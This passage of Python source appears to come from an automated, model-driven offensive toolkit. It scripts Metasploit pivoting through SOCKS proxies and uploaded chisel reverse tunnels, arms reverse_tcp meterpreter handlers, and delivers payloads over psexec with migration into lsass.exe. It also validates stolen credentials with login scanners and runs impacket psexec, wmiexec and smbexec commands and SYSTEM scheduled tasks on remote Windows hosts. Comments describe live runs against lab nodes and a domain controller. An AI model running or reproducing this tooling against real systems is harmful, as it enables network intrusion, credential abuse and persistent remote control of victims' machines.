                str(binding.session.session_id), "ifconfig", settle=1.0)
        except Exception:
            text = ""
        lines = [line.strip() for line in str(text).splitlines()]
        prefix = ".".join(str(host).split(".")[:3]) + "."
        address = netmask = ""
        for index, line in enumerate(lines):
            if "IPv4 Address" not in line or ":" not in line:
                continue
            value = line.split(":", 1)[1].strip()
            if value.startswith(prefix):
                address = value
                if index + 1 < len(lines) and "Netmask" in lines[index + 1]:
                    netmask = lines[index + 1].split(":", 1)[1].strip()
                break
        if address and netmask:
            try:
                addr = [int(part) for part in address.split(".")]
                mask = [int(part) for part in netmask.split(".")]
                network = ".".join(str(addr[i] & mask[i]) for i in range(4))
                bits = sum(bin(part).count("1") for part in mask)
                return f"{network}/{bits}"
            except Exception:
                pass
        return ".".join(str(host).split(".")[:3]) + ".0/24"

    def _ensure_socks_proxy(self):
        """Expose the pivot route as the one SOCKS endpoint every consumer shares."""
        cfg = self.options.tunnel or {}
        port = int(cfg.get("socks_port") or 1080)
        def existing():
            # The peer service may name the job `socks_proxy`, `Socks Proxy`, or only
            # expose it through the datastore. Matching the exact string made every
            # psexec preparation wait the full 10 s probe although the job was already up
            # (live 2026-10-19, nodes 2/44/48: `route` phase exactly 10.0 s each).
            for job_id, name in list(self._list_jobs().items()):
                if "socks" in str(name).lower():
                    return job_id
                try:
                    info = self.backend.job_info(job_id)
                except Exception:
                    continue
                if str((info.get("datastore") or {}).get("SRVPORT") or "") == str(port):
                    return job_id
            return ""
        running = existing()
        if running:
            return running
        budget = max(float(self.options.command_timeout), 90.0)
        # Module entry is synchronous here: waiting for a text marker makes an auxiliary
        # module that prints none burn the whole budget (live 2026-10-19: 182 s for a load
        # that answers immediately).
        entered = _await_module(
            lambda: self.backend.console(
                ["use auxiliary/server/socks_proxy"], timeout=10,
                await_markers=("Successfully started", "Failed to load module",
                               "Unknown command")),
            timeout=15.0)
        if not _module_text_ready(entered):
            return ""
        self.backend.console(
            ["set SRVHOST 127.0.0.1", "set SRVPORT " + str(port), "set VERSION 5",
             "run -j"], timeout=15)
        # `run -j` is asynchronous. A producer does not need to block ten seconds for a
        # job the current consumer may not use (the psexec module explicitly unsets
        # proxies). Return one immediate observation; a consumer that truly needs the
        # endpoint can wait on its own.
        return existing()

    def _pivot_callback_address(self, binding, host):
        """The pivot's own address on the target's segment, or None when there is no pivot.

        A bound stage has to be dialled back to the target, and on this lab that dial goes
        through the pivot's routed session: the module reports the session and then closes
        it before the stage initialises (live 2026-10-18, node 44, reproduced on a freshly
        reverted target with a migrated pivot). Reading the pivot's interfaces gives the
        address the payload can dial directly, so the same session is used as a listener
        instead of carrying the stage over the route.
        """
        if binding is None or getattr(binding, "binding_kind", "") != "console_session":
            return None
        if str(getattr(binding, "host", "")) == str(host):
            return None
        if str(host) in {str(value) for value in (binding.addresses or [])}:
            return None
        session_id = str(binding.session.session_id)
        try:
            text = self.backend._meterpreter_single(session_id, "ifconfig", settle=1.5)
        except Exception:
            return None
        prefix = ".".join(str(host).split(".")[:3]) + "."
        for line in str(text).splitlines():
            if "IPv4 Address" not in line or ":" not in line:
                continue
            value = line.split(":", 1)[1].strip()
            if value.startswith(prefix):
                return value
        return None

    def _tunnel_config(self):
        cfg = self.options.tunnel or {}
        return cfg if cfg.get("enabled") else None

    def _deploy_tunnel_binaries(self, cfg):
        """Put both tunnel binaries where the tunnel needs them.

        The materials push is a single base64 command, and these files are about 8 MB, so
        they take the controller's own host-to-guest copy path instead. The controller owns
        the VM and its credentials, and the copy is bounded by the guest, not by a shell.
        """
        from pathlib import Path as _Path
        import subprocess

        vmrun = str(cfg.get("vmrun") or "")
        vmx = str(cfg.get("kali_vmx") or "")
        if not vmrun or not vmx or not _Path(vmrun).exists():
            return False
        user = str(cfg.get("kali_user") or "kali")
        password = str(cfg.get("kali_password") or "kali")
        root = _Path(__file__).resolve().parent
        for source, remote in ((root / "bin" / "chisel", "/home/kali/chisel"),
                               (root / "bin" / "chisel.exe", "/home/kali/chisel.exe")):
            if not source.exists():
                return False
            probe = ("test -f " + remote + " && echo AGV_BIN_PRESENT "
                     "|| echo AGV_BIN_MISSING")
            text = self._stdout_text(self.transports.execute(
                self._receiver_binding(),
                ExecutionRequest(tool="code", name="bash", via="kali",
                                 content=probe)).get("response"))
            if "AGV_BIN_PRESENT" in text:
                continue
            copied = subprocess.run(
                [vmrun, "-T", "ws", "-gu", user, "-gp", password,
                 "copyFileFromHostToGuest", vmx, str(source), remote],
                capture_output=True)
            if copied.returncode != 0:
                return False
        text = self._stdout_text(self.transports.execute(
            self._receiver_binding(),
            ExecutionRequest(tool="code", name="bash", via="kali",
                             content=("chmod 0755 /home/kali/chisel && "
                                      "chmod 0644 /home/kali/chisel.exe && "
                                      "echo AGV_BIN_READY"))).get("response"))
        return "AGV_BIN_READY" in text

    def _ensure_tunnel(self, binding, host, callback_host):
        """Start the one tunnel every consumer shares and return its endpoints.

        The control side gets a SOCKS listener that dials from the pivot, and the pivot
        listens on each declared callback port and forwards it back. A command line tool
        points at the SOCKS listener; a framework module points at the forwarded port.
        Both leave the framework's own session route out of the data path, which is what
        made a bound stage die after it was sent (live 2026-10-18, node 44).
        """
        cfg = self._tunnel_config()
        if not cfg or binding is None or getattr(binding, "binding_kind", "") != "console_session":
            return None
        if str(getattr(binding, "host", "")) == str(host):
            return None
        if not self._deploy_tunnel_binaries(cfg):
            raise PipelineFailure("参数没给到", "owner_tunnel_binary_missing")
        key = str(getattr(binding, "host", "pivot"))
        state = self._tunnels.get(key)
        if state and state.get("ready"):
            return state
        server_port = int(cfg.get("server_port") or 9001)
        socks_port = int(cfg.get("socks_port") or 1080)
        binary = str(cfg.get("server_binary") or "/home/kali/chisel")
        ports = [int(value) for value in (cfg.get("callback_ports") or [])]
        if not ports:
            return None
        probe = ("ss -lnt | grep -q ':%d ' && echo AGV_TUNNEL_UP || "
                 "echo AGV_TUNNEL_DOWN") % server_port
        text = self._stdout_text(self.transports.execute(
            self._receiver_binding(),
            ExecutionRequest(tool="code", name="bash", via="kali", content=probe)).get("response"))
        if "AGV_TUNNEL_UP" not in text:
            start = ("setsid nohup %s server -p %d --reverse >/tmp/agv_chisel.log 2>&1 "
                     "</dev/null & sleep 3; ss -lnt | grep -q ':%d ' && echo AGV_TUNNEL_UP "
                     "|| echo AGV_TUNNEL_DOWN") % (binary, server_port, server_port)
            text = self._stdout_text(self.transports.execute(
                self._receiver_binding(),
                ExecutionRequest(tool="code", name="bash", via="kali",
                                 content=start)).get("response"))
            if "AGV_TUNNEL_UP" not in text:
                raise PipelineFailure("会话没接上", "owner_tunnel_server_unavailable")
        session_id = str(binding.session.session_id)
        client_remote = str(cfg.get("client_remote") or "C:/Windows/Temp/chisel.exe")
        source = str(cfg.get("client_source") or "/home/kali/chisel.exe")
        task = str(cfg.get("task_name") or "agvtunnel")
        reference = self.backend.reference_for(session_id, previous=binding.session)
        # The pivot keeps the client between attempts; an 8 MB upload over a session costs
        # minutes, so only send it when the file is not already there.
        windows_path = client_remote.replace("/", "\\")
        try:
            present = self.backend.execute(reference, SessionRequest(
                command=("if exist " + windows_path
                         + " (echo AGV_CLIENT_PRESENT) else (echo AGV_CLIENT_MISSING)"),
                end_markers=("AGV_CLIENT_PRESENT", "AGV_CLIENT_MISSING"), timeout=60))
            have_client = "AGV_CLIENT_PRESENT" in (present.output or "")
        except Exception:
            have_client = False
        if not have_client:
            self.backend.console(
                ["sessions -i " + session_id,
                 "upload " + source + " " + client_remote,
                 "background"],
                timeout=max(float(self.options.command_timeout) * 4, 300.0),
                await_markers=("Completed", "Failed", "Error", "not found"))
        remotes = " ".join("0.0.0.0:%d:127.0.0.1:%d" % (port, port) for port in ports)
        command = "%s client %s:%d R:socks %s" % (client_remote, callback_host,
                                                  server_port, remotes)
        # A running client keeps exactly the forwards it was started with. Restart it only
        # when a required port is missing, so sessions that earlier actions already hold
        # through this tunnel are not dropped on every new action.
        verify = " & ".join("netstat -ano | findstr :%d" % port for port in ports)
        try:
            current = self.backend.execute(reference, SessionRequest(
                command=verify, end_markers=tuple(str(port) for port in ports), timeout=60))
            current_text = current.output or ""
        except Exception:
            current_text = ""
        if not all(str(port) in current_text for port in ports):
            try:
                self.backend.execute(reference, SessionRequest(
                    command="taskkill /IM chisel.exe /F",
                    end_markers=("成功", "失败", "错误"), timeout=60))
            except Exception:
                pass
            for line in ("schtasks /delete /tn " + task + " /f",
                         'schtasks /create /tn ' + task + ' /tr "' + command
                         + '" /sc once /st 00:00 /ru SYSTEM /f',
                         "schtasks /run /tn " + task):
                try:
                    self.backend.execute(reference, SessionRequest(
                        command=line, end_markers=("成功", "失败", "错误", "ERROR"), timeout=90))
                except Exception as exc:
                    if isinstance(exc, PipelineFailure):
                        raise
                    raise PipelineFailure("会话没接上",
                                          "owner_tunnel_client_unavailable") from None
        check = " & ".join("netstat -ano | findstr :%d" % port for port in ports)
        def forwarded():
            try:
                result = self.backend.execute(reference, SessionRequest(
                    command=check, end_markers=tuple(str(port) for port in ports), timeout=90))
                seen = result.output or ""
            except Exception:
                seen = ""
            return seen if any(str(port) in seen for port in ports) else ""
        # The scheduled task creates the forward asynchronously; observe the ports.
        if not _await_ready(forwarded, timeout=20.0, interval=1.0):
            raise PipelineFailure("会话没接上", "owner_tunnel_forward_unavailable")
        state = {"ready": True, "socks": "127.0.0.1:%d" % socks_port,
                 "ports": ports, "reference": reference}
        self._tunnels[key] = state
        return state

    def _reserve_tunnel_port(self, state):
        for port in state["ports"]:
            if port not in self._tunnel_ports:
                self._tunnel_ports.add(port)
                return port
        raise PipelineFailure("参数没给到", "owner_tunnel_ports_exhausted")

    def _tunnel_handler_for(self, port):
        """The handler this process can reuse for a forwarded port, if one is already up.

        A previous run may have left a listener on the same port (the peer service keeps
        jobs across consoles). Reusing that job is both cheaper and correct: arming a second
        listener on a bound port fails and the node then reports `owner_handler_not_armed`.
        """
        for job_id, name in list(self._list_jobs().items()):
            if "handler" not in str(name).lower():
                continue
            try:
                info = self.backend.job_info(job_id)
            except Exception:
                continue
            datastore = info.get("datastore") or {}
            if str(datastore.get("LPORT") or "") == str(port):
                return job_id
        return ""

    def _arm_tunnel_handler(self, port):
        """Arm the callback listener this forwarded port leads to.

        The handler is armed without any global proxy or target: both are global datastore
        keys that a previous SMB module leaves behind, and a handler inherits them
        (`Invalid target index`, or a silent job exit) instead of binding (live 2026-10-18).
        """
        budget = max(float(self.options.command_timeout), 120.0)
        # Enter the module in its own call. Sending `use` together with the settings lets a
        # busy console drop the first line, and every option then lands in the global
        # datastore while `exploit` runs whatever module was current before.
        entered = _await_module(
            lambda: self.backend.console(
                ["unsetg Proxies", "unsetg TARGET", "use exploit/multi/handler"],
                timeout=min(budget, 10.0),
                await_markers=("Using configured payload", "Failed to load module",
                               "Unknown command")),
            timeout=budget)
        if not _module_text_ready(entered):
            raise PipelineFailure("会话没接上", "owner_handler_not_armed")
        before = set(self._list_jobs())
        self.backend.console(
            ["set PAYLOAD windows/x64/meterpreter/reverse_tcp",
             "set LHOST 0.0.0.0", "set LPORT " + str(port),
             "set ExitOnSession false", "exploit -j -z"],
            timeout=budget)
        def fresh_handler():
            jobs = self._list_jobs()
            return next((job_id for job_id, name in jobs.items()
                         if job_id not in before and "handler" in str(name).lower()), "")
        job = _await_ready(fresh_handler, timeout=15.0, interval=0.5)
        if not job:
            raise PipelineFailure("会话没接上", "owner_handler_not_armed")
        return job

    def _psexec_native(self, host, user, secret, operation_id, command="", binding=None):
        """Run a Windows payload as the SMB service binary and hand its session back.

        A classic psexec starts a helper process from a service; where the service Job reaps
        children the session opens and immediately dies (live 2026-10-17, node 44: three
        attempts, `Died` right after the bind port appeared). The peer service's own module
        with the native-upload target makes the payload itself the service binary, so there
        is no helper to reap. The session is read back from the console, never inferred from
        command output.
        """
        #: Where the wall time goes before the module's own call. A state-change step took
        #: 296 s while the command itself returned in 6.7 s (live 2026-10-19, node 2): the
        #: receipt must name the preparation phase instead of only the final call.
        phases: dict[str, float] = {}
        clock = [monotonic()]

        def mark(name):
            now = monotonic()
            phases[name] = round(now - clock[0], 1)
            clock[0] = now

        payload = self._action_payloads.get(operation_id)
        for attempt in range(2):
            try:
                self._ensure_route(binding, host, mark=mark)
                break
            except PipelineFailure as exc:
                # Route preparation is read-only; the peer service occasionally closes one
                # connection without a response (RemoteDisconnected). Repeating the prep is
                # safe, repeating a dispatched command is not.
                if getattr(exc, "retryable", None) is not True or attempt == 1:
                    raise
                sleep(5.0)
        mark("route")
        if payload is not None:
            bind_port = int(payload.callback_port)
        elif str(command).strip():
            # A node that only needs a state change has no hand-over reservation. The channel
            # is a means here, not a deliverable: one bound port lets the service payload
            # start, the command runs inside that channel, and the channel is closed again.
            from random import randint
            bind_port = randint(43000, 43999)
        else:
            raise PipelineFailure("参数没给到", "owner_delivery_reservation_unknown")
        domain, _, account = str(user).partition("\\")
        if not account:
            domain, account = "", str(user)
        # A bind payload needs no receiver here, so the reverse handler this attempt armed
        # is released instead of left as a stray listener. Its reserved port stays unique
        # to this attempt and becomes the target-side bind port.
        job = self._handlers.pop(operation_id, "")
        if job:
            try:
                self.backend.console(["jobs -k " + job], timeout=self.options.command_timeout)
            except Exception:
                pass
        mark("release")
        # The module has to be the console's current context before any `set`; otherwise the
        # options land in the global datastore and `run` answers "Unknown command: run"
        # (live 2026-10-18). A module that is still loading answers with a load error, so the
        # context is observed instead of assumed.
        budget = max(float(self.options.command_timeout), 60.0)
        text = _await_module(
            lambda: self.backend.console(
                ["use exploit/windows/smb/psexec"], timeout=min(budget, 10.0),
                await_markers=("payload", "Failed to load module", "Unknown command")),
            timeout=budget)
        if not _module_text_ready(text):
            raise PipelineFailure("参数没给到", "owner_psexec_module_unavailable")
        mark("module")
        if str(command).strip():
            # A state-change node has no session to hand over, and while the target's
            # firewall is still on a bound port cannot be reached at all. The module's
            # Command target performs the same service creation the writeup does
            # (`sc create` + `sc start` with the command as the service binary) and reads
            # the command's own output back; the credential is supplied explicitly because
            # this run's pivot session is the machine account, which SCM rejects.
            step = str(command).strip().replace("\n", " & ")
            # The module needs the target and credential in the same call. Setting only
            # TARGET/PAYLOAD/CMD leaves the previous datastore in place, so the module runs
            # against nothing and the receipt is empty (live 2026-10-18, node 2 alignment).
            settings = ["set RHOSTS " + str(host), "set RPORT 445",
                        "set SMBUser " + str(account),
                        "set SMBPass " + str(secret)]
            if domain:
                settings.append("set SMBDomain " + str(domain))
            started = monotonic()
            text = self.backend.console(
                settings + ["set TARGET 4",
                 "set PAYLOAD cmd/windows/generic",
                 "set CMD " + step,
                 # This module version exposes only CMD::DELAY (a fixed pause before reading
                 # the command's output); RETRY/DELAY are not options here. Keep the pause
                 # short and record the elapsed time so the next run shows where it went.
                 "set CMD::DELAY 1",
                 "run"],
                timeout=max(float(self.options.callback_timeout), 120.0),
                await_markers=("Command completed successfully", "Exploit failed",
                               "Auxiliary failed", "Login Failed", "Access is denied"))
            marker = "Output for "
            if marker in text:
                body = text.split(marker, 1)[1]
                body = body.split("\n", 1)[1] if "\n" in body else ""
                body = body.split("[*] Exploit completed")[0]
            else:
                body = ""
            known = "Command completed successfully" in text
            elapsed = round(monotonic() - started, 1)
            mark("run")
            # The module's own status is not part of the command output; carry it as a
            # marker so the receipt states "the write ran" independently of whether the
            # command printed anything (a silent netsh prints "确定。" only).
            body_text = body.strip()
            if known:
                body_text = "agv-psexec-command-ok\n" + body_text
            return {"effect_known": known,
                    "response": {"stdout": body_text, "return_code": 0 if known else 1,
                                 "elapsed_s": elapsed,
                                 "phases": phases,
                                 "transport_error": False, "timed_out": not known}}
        baseline = sorted(self.backend.list_sessions())
        lines = ["unsetg Proxies",
                 "set RHOSTS " + str(host),
                 # SMB port is fixed for this technique. Leaving it to the previous
                 # experiment's datastore made the module dial a forwarded port that no
                 # longer existed (live 2026-10-18: `Connecting to 192.168.93.30:4450`).
                 "set RPORT 445",
                 "set SMBUser " + str(account),
                 "set SMBPass " + str(secret)]
        if domain:
            lines.append("set SMBDomain " + str(domain))
        pivot_lhost = self._pivot_callback_address(binding, host)
        tunnel = None
        if pivot_lhost and payload is not None:
            try:
                tunnel = self._ensure_tunnel(binding, host, payload.callback_host)
            except PipelineFailure:
                # The reverse-through-pivot path below is already verified; a tunnel that
                # cannot start must not turn a working node into a failed one.
                tunnel = None
        if tunnel is not None:
            # One transport for every consumer: SMB goes through the shared SOCKS endpoint,
            # and the payload dials a port the pivot forwards back to this handler. The
            # framework route is not used at all.
            callback_port = self._reserve_tunnel_port(tunnel)
            if not self._tunnel_handler_for(callback_port):
                self._arm_tunnel_handler(callback_port)
            lines += ["set Proxies socks5:" + tunnel["socks"],
                      "set PAYLOAD windows/x64/meterpreter/reverse_tcp",
                      "set LHOST " + pivot_lhost,
                      "set LPORT " + str(callback_port),
                      "set DisablePayloadHandler true",
                      "set TARGET 2",
                      "set EXITFUNC thread",
                      "run"]
        elif pivot_lhost:
            # The stage must dial the pivot, not wait to be dialled through the route: the
            # peer service accepts the route for SMB and for the service start, but the
            # bound stage is closed the moment it is sent (live 2026-10-18, node 44). A
            # reverse payload whose callback lands on the pivot's own target-side address
            # keeps the traffic origin on the same host and opens the session normally.
            lines += ["set PAYLOAD windows/x64/meterpreter/reverse_tcp",
                      "set LHOST " + pivot_lhost,
                      "set LPORT " + str(bind_port),
                      "set TARGET 2",
                      "set EXITFUNC thread",
                      "run"]
        else:
            lines += ["set PAYLOAD windows/x64/meterpreter/bind_tcp",
                      "set RHOST " + str(host),
                      "set LPORT " + str(bind_port),
                      "set TARGET 2",
                      "set EXITFUNC thread",
                      # Foreground `run` waits for the session and reports it, which is what
                      # the produced-session wait needs. It also attaches the console to that
                      # session, so the caller detaches right after the wait.
                      "run"]
        accept_endpoint = ("127.0.0.1:" + str(callback_port)) if tunnel is not None else None
        produced = None
        try:
            text = self.backend.console(
                # The module reports through the console, but the session itself is the fact
                # and is polled below. A shorter console window avoids paying the full text
                # budget when the stage has already connected (live 2026-10-19, node 48:
                # 154 s for a session that was already up).
                # The session itself is the fact and is polled below. A text-only
                # 75-second budget made a transient miss cost more than a minute
                # (live 2026-10-19, node 44: 192 s while the session was already up).
                lines, timeout=25.0,
                await_markers=("Meterpreter session", "Exploit completed", "Exploit failed",
                               "Auxiliary failed", "Address already in use", "Login Failed"))
            mark("run")
        except PipelineFailure as exc:
            if getattr(exc, "retryable", None) is not True:
                raise
            # The request may have been delivered before the connection dropped. Reconcile
            # first: a session this attempt produced is the answer, and the command is
            # re-issued only when no such session exists.
            produced = self._await_produced_session(host, baseline,
                                                    accept_endpoint=accept_endpoint)
            if produced is not None:
                text = ""
            else:
                text = self.backend.console(
                    lines, timeout=25.0,
                    await_markers=("Meterpreter session", "Exploit completed",
                                   "Exploit failed", "Auxiliary failed",
                                   "Address already in use", "Login Failed"))
        if produced is None:
            produced = self._await_produced_session(host, baseline,
                                                    accept_endpoint=accept_endpoint)
        # `run` attaches the console to the session it just opened. Leave that prompt before
        # returning, or the next stage's module commands are typed into the meterpreter
        # console instead of the framework console.
        try:
            self.backend.console(["background"], timeout=20)
        except Exception:
            pass
        if produced is not None and str(command).strip():
            # Run the requested command inside the channel and close the channel: this node
            # owes a state change, not a carrier, so the receipt carries the real output.
            from src.session.session_backend import SessionRequest
            reference = self.backend.reference_for(produced["session_id"])
            try:
                result = self.backend.execute(reference, SessionRequest(
                    command=str(command), end_markers=("agv-call-end",),
                    timeout=max(float(self.options.command_timeout), 90.0)))
                known = bool(result.operation_confirmed)
                output = result.output
            finally:
                try:
                    self.backend.console(["sessions -k " + produced["session_id"]],
                                         timeout=self.options.command_timeout)
                except Exception:
                    pass
            return {"effect_known": known,
                    "response": {"stdout": output, "return_code": 0 if known else 1,
                                 "transport_error": False, "timed_out": not known}}
        if produced is not None:
            # The peer service deletes the service right after it starts, and the payload it
            # launched is the service binary: the session dies minutes later (live 2026-10-18,
            # PC1 and DC). Move it into a long-lived process before handing it over, the same
            # step an operator takes by hand.
            for target in ("explorer.exe", "lsass.exe"):
                try:
                    self.backend._meterpreter_single(produced["session_id"],
                                                     "migrate -N " + target, settle=2.0)
                    self.backend.get_session(produced["session_id"])
                    break
                except Exception:
                    continue
            self._produced_sessions[operation_id] = produced
        return {"effect_known": produced is not None,
                "response": {"stdout": text,
                             "return_code": 0 if produced is not None else 1,
                             "phases": phases,
                             "transport_error": False,
                             "timed_out": produced is None}}

    def _await_produced_session(self, host, baseline, accept_endpoint=None):
        """Wait for the session this attempt opened, never an older one on the same host.

        A session that arrived through the pivot's forwarded port reports the tunnel
        endpoint (`127.0.0.1:<port>`) as its host, not the target's address. The endpoint is
        the evidence that this attempt produced it, and the target host is what the run must
        register, so the mapping happens here rather than in every caller.
        """
        if self.backend is None:
            return None
        window = max(float(self.options.callback_timeout), 60.0)
        deadline = monotonic() + window
        while True:
            for session_id, metadata in sorted(self.backend.list_sessions().items()):
                if str(session_id) in baseline:
                    continue
                endpoint = str(getattr(metadata, "callback_endpoint", "") or "")
                via_tunnel = bool(accept_endpoint) and endpoint.startswith(str(accept_endpoint))
                if str(metadata.host) != str(host) and not via_tunnel:
                    continue
                reference = self.backend.reference_for(session_id)
                return {"reference": reference.model_dump(),
                        "host": str(host) if via_tunnel else str(metadata.host),
                        "observed_address": str(metadata.host),
                        "platform": str(metadata.platform), "type": str(metadata.type),
                        "session_id": str(session_id)}
            remaining = deadline - monotonic()
            if remaining <= 0:
                return None
            sleep(min(float(self.options.poll_interval), remaining))

    def test_credential(self, *, host, credential_ref, method="smb", port=None, timeout=60):
        """Validate one stored credential with the peer service's login scanners.

        The model names the method and the credential reference; the owner resolves the
        secret and runs the scanner on the control plane. The secret is redacted from the
        text returned to the model.
        """
        if self.credentials is None:
            raise PipelineFailure("参数没给到", "credential_store_unavailable")
        try:
            resolved = self.credentials.resolve(credential_ref, require_valid=False,
                                                target=str(host))
        except KeyError:
            raise PipelineFailure("参数没给到", "credential_ref_unknown") from None
        except ValueError as exc:
            raise PipelineFailure("参数没给到", str(exc)) from None
        principal = str(resolved.principal)
        domain, _, user = principal.rpartition("\\")
        if not user:
            user, domain = principal, ""
        secret = resolved.secret.get_secret_value()
        modules = {"smb": "auxiliary/scanner/smb/smb_login",
                   "ldap": "auxiliary/scanner/ldap/ldap_login",
                   "winrm": "auxiliary/scanner/winrm/winrm_login",
                   "kerberos": "auxiliary/scanner/kerberos/kerberos_login"}
        chosen = str(method or "smb").lower()
        lines = ["use " + modules.get(chosen, modules["smb"])]
        if chosen == "smb":
            lines += ["set RHOSTS " + str(host), "set RPORT " + str(port or 445),
                      "set SMBUser " + user, "set SMBPass " + secret]
            if domain:
                lines.append("set SMBDomain " + domain)
        elif chosen == "ldap":
            lines += ["set RHOSTS " + str(host), "set RPORT " + str(port or 389),
                      "set USERNAME " + user, "set PASSWORD " + secret]
            if domain:
                lines.append("set DOMAIN " + domain)
        elif chosen == "winrm":
            lines += ["set RHOSTS " + str(host), "set RPORT " + str(port or 5985),
                      "set USERNAME " + user, "set PASSWORD " + secret]
            if domain:
                lines.append("set DOMAIN " + domain)
        else:
            lines += ["set RHOSTS " + str(host), "set RPORT " + str(port or 88),
                      "set USERNAME " + user, "set PASSWORD " + secret]
            if domain:
                lines.append("set DOMAIN " + domain)
        lines += ["set STOP_ON_SUCCESS true", "set VERBOSE false", "run"]
        if self.transports is not None:
            if chosen == "smb":
                # Native SMB credential validation: one client call, no shared MSF
                # console and no module cache to initialise. The secret stays in this
                # process's argv and is redacted from the receipt.
                quote = shlex.quote
                command = ("nxc smb " + quote(str(host)) + " -u " + quote(user)
                           + " -p " + quote(secret)
                           + ((" -d " + quote(domain)) if domain else ""))
                try:
                    result = self.transports.execute(
                        self._receiver_binding(),
                        ExecutionRequest(tool="code", name="bash", via="kali",
                                         content=command))
                    text = ExecutionSessionOwner._stdout_text(
                        result.get("response")).replace(secret, "***")
                    confirmed = bool(result.get("effect_known"))
                    return {"effect_known": confirmed,
                            "response": {"stdout": text,
                                         "return_code": 0 if confirmed else 1,
                                         "transport_error": False, "timed_out": False,
                                         "credential_valid": credential_verdict(text)}}
                except Exception:
                    pass
            # A separate msfconsole process per test: the shared console can be left in a
            # session/module context by an earlier stage, and a module that fails to load
            # there says nothing about the credential. The entry transport returns the
            # scanner's own stdout.
            script = "; ".join([*lines, "exit -y"])
            command = "msfconsole -q -x " + shlex.quote(script)
            try:
                result = self.transports.execute(
                    self._receiver_binding(),
                    ExecutionRequest(tool="code", name="bash", via="kali",
                                     content=command))
            except Exception:
                raise PipelineFailure("会话没接上",
                                      "credential_test_scanner_unavailable") from None
            text = ExecutionSessionOwner._stdout_text(result.get("response"))
            confirmed = bool(result.get("effect_known"))
        else:
            try:
                text = self.backend.console(
                    lines, timeout=float(timeout),
                    await_markers=("Auxiliary module execution completed", "Success",
                                   "FAILED", "Unknown command", "Failed to load module"))
            except Exception:
                raise PipelineFailure("会话没接上", "credential_test_console_failed") from None
            confirmed = True
        # A console may echo `set SMBPass ...`; never hand the secret back to the model.
        text = str(text or "").replace(secret, "***")
        return {"effect_known": confirmed,
                "response": {"stdout": text, "return_code": 0 if confirmed else 1,
                             "transport_error": False, "timed_out": False,
                             "credential_valid": credential_verdict(text)}}

    def control_remote_process(self, binding, host, command, credential_ref="", method="wmic",
                               local_path="", remote_path="", operation_id=""):
        """Create a process on a remote host with the deployment credential.

        The model supplies the host and command only; the secret is resolved here and never
        enters the request text. This is a control-plane helper for the tool layer.
        """
        credential_ref = str(credential_ref or self.default_credential_ref or "")
        if credential_ref:
            if self.credentials is None:
                raise PipelineFailure("参数没给到", "credential_store_unavailable")
            try:
                resolved = self.credentials.resolve(credential_ref, require_valid=True,
                                                    target=str(host))
            except KeyError:
                raise PipelineFailure("参数没给到", "credential_ref_unknown") from None
            except ValueError as exc:
                raise PipelineFailure("参数没给到", str(exc)) from None
            user, secret = resolved.principal, resolved.secret.get_secret_value()
        else:
            # Legacy deployment credential: kept for existing lab nodes until every card
            # carries a credential_ref. It has no validation state and is never reported
            # as a verified credential.
            options = self.options.delivery or {}
            user = str(options.get("domain_user") or "")
            secret = str(options.get("domain_password") or "")
            if not user or not secret:
                raise PipelineFailure("参数没给到", "credential_domain_missing")
        if method == "msf_psexec":
            return self._psexec_native(host, user, secret, str(operation_id), str(command),
                                       binding=binding)
        if method == "smbexec":
            # Service-based remote execution with its output, the technique the SCM rules
            # actually name. Impacket's smbexec runs each line through a temporary service
            # and captures its output, so a node that owes a *state change* gets a receipt it
            # can be judged on. `-codec gbk` keeps a Chinese Windows readable (live
            # 2026-10-18: node 2, where `sc` from the SYSTEM session was refused by
            # OpenSCManager and WMI was absent from the target's PATH).
            destination = (user.replace("\\", "/") + ":" + secret + "@" + str(host))
            # One service run per line: a state change followed by its read-back has to be
            # two executions, or the second one reports the state before the first finished.
            steps = [row for row in str(command).replace("\r\n", "\n").split("\n")
                     if row.strip()]
            piped = "".join("echo " + shlex.quote(row) + "; " for row in steps) + "echo exit; "
            line = ("{ " + piped + "} | impacket-smbexec -codec gbk "
                    + shlex.quote(destination) + " 2>&1")
            result = self.transports.execute(self._receiver_binding(), ExecutionRequest(
                tool="code", name="bash", via="kali", content=line))
            response = result.get("response") or {}
            text = _receipt_stdout(response)
            # The tool prints the target prompt right before the first output line, so the
            # first line arrives as `C:\Windows\system32>AGV_POST_NONCE=...`; drop the prompt
            # itself instead of the whole line, or the nonce is lost with it.
            text = text.replace("C:\\Windows\\system32>", "\n")
            # Drop the tool's banner and the target prompt; keep the command's own output.
            kept = [row for row in text.splitlines()
                    if row.strip() and not row.startswith(("[!] Launching", "Impacket v",
                                                           "C:\\Windows\\system32>"))]
            body = "\n".join(kept).strip()
            # A silent command (netsh prints nothing on success) still executed; only a
            # transport-level failure means the effect is unknown.
            return {"effect_known": bool(result.get("effect_known")),
                    "response": {"stdout": body,
                                 "return_code": response.get("return_code", 0),
                                 "transport_error": bool(response.get("transport_error")),
                                 "timed_out": bool(response.get("timed_out"))}}
        if method in {"psexec", "wmiexec"}:
            # Impacket runs on the control box; the secret stays in this command line,
            # never in the request or the model transcript.
            destination = (user.replace("\\", "/") + ":" + secret + "@" + str(host))
            line = ("impacket-" + method + " " + shlex.quote(destination) + " "
                    + shlex.quote("cmd /c " + str(command)))
            result = self.transports.execute(self._receiver_binding(), ExecutionRequest(
                tool="code", name="bash", via="kali", content=line))
            return {"effect_known": bool(result.get("effect_known")),
                    "response": result.get("response")}
        if method == "smb_copy":
            if not str(local_path).strip() or not str(remote_path).strip():
                raise PipelineFailure("参数没给到", "credential_smb_paths_missing")
            remote = str(remote_path)
            relative = remote[3:] if remote.lower().startswith("c:\\") else remote.lstrip("\\")
            line = ("net use \\\\" + str(host) + "\\C$ /user:" + user + " " + secret
                    + " & copy /y " + str(local_path) + " \\\\" + str(host) + "\\C$\\"
                    + relative + " & dir \\\\" + str(host) + "\\C$\\" + relative)
            from deployment.request_dispatch import deliver
            return deliver(binding, {"tool": "cmd", "name": "cmd", "via": "session",
                                     "content": line},
                           backend=self.backend, transports=self.transports)
        if method == "schtasks":
            from secrets import token_hex
            task = "agv_" + token_hex(4)
            marker = "agv-task-end-" + token_hex(6)
            line = ("schtasks /create /s " + str(host) + " /u " + user + " /p " + secret
                    + " /tn " + task + " /tr \"" + str(command) + "\" /sc once /st 23:59"
                    + " /rl HIGHEST /ru SYSTEM /f & schtasks /run /s " + str(host)
                    + " /u " + user + " /p " + secret + " /tn " + task
                    + " & echo " + marker)
            from deployment.request_dispatch import deliver
            first = deliver(binding, {"tool": "cmd", "name": "cmd", "via": "session",
                                      "content": line},
                            backend=self.backend, transports=self.transports)
            # The Windows one-shot channel can return before the command's output is
            # flushed; a second echo drains it. The session claim remains the real gate.
